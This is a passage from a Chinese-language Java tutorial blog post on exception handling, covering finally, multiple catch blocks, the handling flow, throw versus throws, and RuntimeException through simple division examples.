对于异常处理格式可以在最后追加一个finally语句，表示异常处理后的出口，不管是否出现异常都执行。</p><p>范例：使用finally</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异常处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】*****程序开始执行*****&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【2】*****数学计算********&quot;</span> + (<span class="number">10</span> / <span class="number">0</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ArithmeticException e)&#123;</span><br><span class="line">            e.printStackTrace();<span class="comment">//处理异常</span></span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【F】不管是否出现异常都会执行&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】*****程序执行完毕*****&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时程序中有异常，没有异常也执行finally。</p><h5 id="处理多个异常"><a href="#处理多个异常" class="headerlink" title="处理多个异常"></a>处理多个异常</h5><p>​    很多时候在程序执行的过程之中可能会产生若干个异常，那么这种情况下也可以使用多个catch进行异常的捕获。现在假设通过初始化的参数来进行两个数学计算数字的设置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//多个异常处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】*****程序开始执行*****&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> Integer.parseInt(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">            System.out.println(<span class="string">&quot;【2】*****数学计算********&quot;</span> + (x / y));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ArithmeticException e)&#123;</span><br><span class="line">            e.printStackTrace();<span class="comment">//处理异常</span></span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【F】不管是否出现异常都会执行&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】*****程序执行完毕*****&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    那么对于此时的程序可能出现三类异常：</p><p>​    1、【未处理】程序执行的时候没有输入初始化参数：（注意此时F照常输出、3被中断）</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73615.jpg"                      alt="image-20220715154558294"                ></p><p>​    2、【未处理】输入的数据不是数字</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073616.jpg"                      alt="image-20220715154943226"                ></p><p>​    3、【已处理】输入的被除数为0</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073617.jpg"                      alt="image-20220715155117218"                ></p><p>​    现在即便有了异常处理语句，但是如果没有进行正确的异常捕获，那么程序也会导致中断（finally的代码依然执行），所以在这样的情况下就必须进行多个异常的捕获。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//多个异常处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】*****程序开始执行*****&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> Integer.parseInt(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">            System.out.println(<span class="string">&quot;【2】*****数学计算********&quot;</span> + (x / y));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ArithmeticException e)&#123;</span><br><span class="line">            e.printStackTrace();<span class="comment">//处理异常</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (NumberFormatException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ArrayIndexOutOfBoundsException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【F】不管是否出现异常都会执行&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】*****程序执行完毕*****&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时开发者都知道已经知道有哪些异常才能写出如上的程序，那么又何必非要用个异常处理呢？直接多写点判断不就可以了。所以以上只是个理想化模版。</p><h5 id="异常处理流程"><a href="#异常处理流程" class="headerlink" title="异常处理流程"></a>异常处理流程</h5><p>​    在进行异常处理的时候如果将所有可能已经明确知道要产生的异常都进行了捕获，虽然可以得到良好的代码结构，但是编写是非常麻烦的。所以现在要想进行合理异常就必须在异常产生之后程序到底做了哪些处理。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073618.jpg"                      alt="image-20220715161820703"                ></p><p>​    1、在程序运行的过程中才会产生异常，而一旦程序执行中产生了异常将自动进行指定类型的异常类对象实例化处理。</p><p>​    2、如果此时程序之中并没有提供有异常处理的支持，则会采用JVM的默认异常处理方式，首先进行异常信息的打印，而后直接退出当前的程序。</p><p>​    3、此时程序中如果存在有异常处理，那么这个产生的异常类的实例化对象将会被try语句所捕获。</p><p>​    4、try捕获到异常之后与其匹配的catch中的异常类型进行依次的比对，如果此时与catch中的捕获异常类型相同，则认为应该用此catch进行异常处理，如果不匹配则继续匹配后续的catch类型，如果不成功，则认为catch无法处理。</p><p>​    5、不管异常是否处理最终都要执行finally语句。但是当执行完成finally的程序之后会进一步判断当前的异常是否已经处理过了，如果处理过了，则继续向后执行其他代码，如果没有处理则交由JVM进行默认处理。</p><p>​    通过分析异常处理流程当中实际上操作的还是一个异常类的实例化对象。那么这个异常类的实例化对象的类型就成为了理解异常处理的核心关键所在，在之前接触过了两种异常：</p><table><thead><tr><th>ArithmeticException</th><th>ArrayIndexOutOfBoundsException</th></tr></thead><tbody><tr><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073623.jpg"                      alt="image-20220715173432490"                ></td><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073624.jpg"                      alt="image-20220715173617037"                ></td></tr></tbody></table><p>​    可以发现在程序之中可以处理的异常的最大的类型就是Throwable，而打开Thorwable观察，里面有两个子类</p><p>​    1、Error：此时程序还未执行出现的错误，开发者无法处理；</p><p>​    2、Exception：程序中出现的异常，开发者可以处理，真正开发中处理的。</p><p>​    通过分析可以发现异常产生的时候会产生异常的实例化对象，那么按照对象的引用原则，可以自动向父类转型，那么如果按照这样的逻辑，实际上所有的异常都可以使用Exception处理。</p><p>范例：简化异常处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//多个异常处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】*****程序开始执行*****&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> Integer.parseInt(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">            System.out.println(<span class="string">&quot;【2】*****数学计算********&quot;</span> + (x / y));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【F】不管是否出现异常都会执行&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】*****程序执行完毕*****&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    当不确定有哪些异常产生的时候，这么处理是最方便的。但是如果这样处理也会产生一个问题，这种形式虽然方便，但是描述的错误信息不明确，所以分开是更明确的处理方式。</p><p>​    ps.在异常处理的时候，要把捕获范围大的异常放在捕获范围小的异常之后。</p><h5 id="throws关键字"><a href="#throws关键字" class="headerlink" title="throws关键字"></a>throws关键字</h5><p>​    通过之前的程序可以发现，在执行程序的过程之中有可能会产生异常，但是如果说现在定义了一个方法，就应该明确的告诉使用者，这个方法可能会产生何种异常，那么此时就可以在方法的声明上使用throws来进行异常类型的标注。</p><p>范例：观察throws的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//throws的使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMath</span> &#123;</span><br><span class="line">    <span class="comment">//这个代码执行的时候可能会产生异常，如果产生异常了调用处处理</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> x / y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test46</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(MyMath.div(<span class="number">10</span>,<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这段代码在编译时会产生如下问题</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073626.jpg"                      alt="image-20220715232546252"                ></p><p>​    我们对于这样的代码在调用方法时，必须在调用时用try catch捕获</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//throws的使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMath</span> &#123;</span><br><span class="line">    <span class="comment">//这个代码执行的时候可能会产生异常，如果产生异常了调用处处理</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> x / y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test46</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(MyMath.div(<span class="number">10</span>,<span class="number">2</span>));<span class="comment">//输出5</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        有异常的情况则会按异常输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//throws的使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMath</span> &#123;</span><br><span class="line">    <span class="comment">//这个代码执行的时候可能会产生异常，如果产生异常了调用处处理</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> x / y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test46</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(MyMath.div(<span class="number">10</span>,<span class="number">0</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073627.jpg"                      alt="image-20220715233001965"                ></p><p>​    主方法本身也是一个方法，那么实际上主方法也可以继续向上抛出。</p><p>范例：在主方法上继续抛出异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//throws的使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMath</span> &#123;</span><br><span class="line">    <span class="comment">//这个代码执行的时候可能会产生异常，如果产生异常了调用处处理</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> x / y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test46</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            System.out.println(MyMath.div(<span class="number">10</span>,<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果主方法继续向上抛出异常，那么就表示此异常将交由JVM负责处理。</p><h5 id="throw关键字"><a href="#throw关键字" class="headerlink" title="throw关键字"></a>throw关键字</h5><p>​    与throws对应的还有throw关键字，此关键字的主要作用在于表示手工进行异常的抛出，即：此时将手工产生一个异常类的实例化对象，并且进行异常的抛出处理。</p><p>范例：观察throw的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//throw的使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test47</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;自己抛着玩的对象&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073628.jpg"                      alt="image-20220716010428918"                ></p><p>​    <strong>throw和throws区别：</strong></p><p>​    <strong>throw：是在代码块中之用的，主要是手工进行异常对象的抛出；</strong></p><p>​    <strong>throws：是在方法定义上使用的，表示将此方法中可能产生的异常明确告诉给调用处，由调用处进行处理。</strong></p><h5 id="异常处理的标准格式"><a href="#异常处理的标准格式" class="headerlink" title="异常处理的标准格式"></a>异常处理的标准格式</h5><p>​    现在已经学习完成了大部分的异常处理格式：try、catch、finally、throw、throws，那么这些关键字在实际的开发之中我们往往会一起进行使用，下面通过一个具体的程序来进行分析。</p><p>​    现在要求定义一个可以实现除法计算的方法，在这个方法之中开发要求如下：</p><p>​    1、进行数学计算开始与结束的时候进行信息提示；</p><p>​    2、进行计算的过程中有异常则交给调用处处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异常处理的标准格式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMath1</span> &#123;</span><br><span class="line">    <span class="comment">//异常被交给调用处处理，则一定要在方法上用throws</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;*** 【START】除法计算开始&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            temp = x / y;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">throw</span> e;<span class="comment">//向上抛异常处理!!!!!!!!!</span></span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;*** 【END】  除法计算结束&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test48</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(MyMath1.div(<span class="number">10</span>,<span class="number">0</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073630.jpg"                      alt="image-20220716013026254"                ></p><p>​    对于此类操作实际上可以简化，省略掉catch与throw的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异常处理的标准格式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMath1</span> &#123;</span><br><span class="line">    <span class="comment">//异常被交给调用处处理，则一定要在方法上用throws</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;*** 【START】除法计算开始&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            temp = x / y;</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;*** 【END】  除法计算结束&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test48</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(MyMath1.div(<span class="number">10</span>,<span class="number">0</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这个代码和上面代码结果一致。在以后的开发过程中，这种异常的处理格式是最为重要的，尤其是当进行一些资源访问的时候尤其重要。</p><h5 id="RuntimeException"><a href="#RuntimeException" class="headerlink" title="RuntimeException"></a>RuntimeException</h5><p>​    通过之前的分析可以发现只要方法后面带有throws的往往都是告诉用户本方法可能产生的异常是什么，所以这个时候来观察一段代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//RuntimeException</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test49</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    下面打开Integer类中的parseInt()方法的定义来观察：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073631.jpg"                      alt="image-20220716015102451"                ></p><p>​    这个方法上明确的抛出了一个异常，但是在处理的时候并没有强制性要求处理。下面我们观察一下NumberFormatException类的继承结构。同时也观察数学计算异常的继承结构。</p><table><thead><tr><th>ArithmeticException</th><th>NumberFormatException</th></tr></thead><tbody><tr><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073632.jpg"                      alt="image-20220715173432490"                ></td><td><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073634.jpg"                      alt="image-20220716015535600"                ></td></tr></tbody></table><p>​    